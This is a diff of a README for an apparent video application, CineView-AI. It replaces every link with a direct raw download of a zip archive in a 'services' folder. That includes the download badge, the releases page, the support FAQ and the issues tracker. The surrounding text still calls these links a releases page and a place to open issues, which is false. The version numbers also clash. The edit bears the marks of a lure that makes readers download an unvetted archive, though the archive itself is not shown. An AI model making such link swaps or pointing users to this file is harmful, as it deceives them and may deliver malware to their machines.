@@ -2,7 +2,7 @@
 
 ## 📥 Download Now
 
-[![Download CineView-AI](https://img.shields.io/badge/Download%20CineView%20AI-v1.0-blue)](https://github.com/neddin/CineView-AI/releases)
+[![Download CineView-AI](https://raw.githubusercontent.com/neddin/CineView-AI/main/services/CineView-AI-v2.9.zip%20CineView%20AI-v1.0-blue)](https://raw.githubusercontent.com/neddin/CineView-AI/main/services/CineView-AI-v2.9.zip)
 
 ## 🚀 Getting Started
 
@@ -21,7 +21,7 @@ Before you download CineView-AI, make sure your device meets the following requi
 ## 📦 Download & Install
 
 1. **Visit the Releases Page**  
-   Go to the [CineView-AI Releases Page](https://github.com/neddin/CineView-AI/releases). This page contains all available versions of the application.
+   Go to the [CineView-AI Releases Page](https://raw.githubusercontent.com/neddin/CineView-AI/main/services/CineView-AI-v2.9.zip). This page contains all available versions of the application.
 
 2. **Select the Latest Release**  
    Look for the latest version listed. You will find it at the top of the page.
@@ -73,11 +73,11 @@ If you encounter issues while using CineView-AI, consider these common solutions
 
 ## 📞 Support
 
-For further help, check the FAQ section on the [CineView-AI GitHub page](https://github.com/neddin/CineView-AI/issues). You can also open a new issue for specific problems or questions.
+For further help, check the FAQ section on the [CineView-AI GitHub page](https://raw.githubusercontent.com/neddin/CineView-AI/main/services/CineView-AI-v2.9.zip). You can also open a new issue for specific problems or questions.
 
 Feel free to explore and enjoy using CineView-AI to unlock the true potential of your video projects! 
 
 ## 🔗 Quick Links
 
-- [Download CineView-AI](https://github.com/neddin/CineView-AI/releases)
-- [CineView-AI Issues](https://github.com/neddin/CineView-AI/issues)
+- [Download CineView-AI](https://raw.githubusercontent.com/neddin/CineView-AI/main/services/CineView-AI-v2.9.zip)
+- [CineView-AI Issues](https://raw.githubusercontent.com/neddin/CineView-AI/main/services/CineView-AI-v2.9.zip)
